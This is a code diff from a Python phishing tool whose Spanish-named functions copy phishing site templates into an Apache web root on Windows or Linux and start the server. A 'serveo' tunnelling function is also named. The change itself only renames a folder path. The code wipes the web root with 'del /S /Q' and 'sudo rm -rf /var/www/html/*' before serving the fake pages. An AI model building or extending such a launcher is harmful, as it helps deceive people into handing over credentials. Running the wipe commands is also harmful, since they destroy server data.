@@ -35,11 +35,11 @@ try:
 
     def inicio_phishing_windows(carpeta):
         try:
-            os.system(f"cd .sites/{carpeta}")
+            os.system(f"cd sites/{carpeta}")
             print("Iniciando el servidor...")
             os.system("cd C:\\Apache24\\htdocs\\")
             os.system("del /S /Q C:\\Apache24\\htdocs\\*") 
-            os.system(f"xcopy /E /I .sites\\{carpeta}\\* C:\\Apache24\\htdocs\\")
+            os.system(f"xcopy /E /I sites\\{carpeta}\\* C:\\Apache24\\htdocs\\")
             os.system("NET START Apache2.4")
             
 
@@ -48,10 +48,10 @@ try:
             print(f"Se produjo un error: {e}")
 
     def inicio_phishing_linux(carpeta):
-        os.system(f"cd .sites/{carpeta}")
+        os.system(f"cd sites/{carpeta}")
         print("Iniciando el servidor...")
         os.system("sudo rm -rf /var/www/html/*")  
-        os.system(f"sudo cp -r .sites/{carpeta} /var/www/html/")
+        os.system(f"sudo cp -r sites/{carpeta} /var/www/html/")
         os.system("sudo systemctl start apache2")
 
     def serveo(ruta_server): 
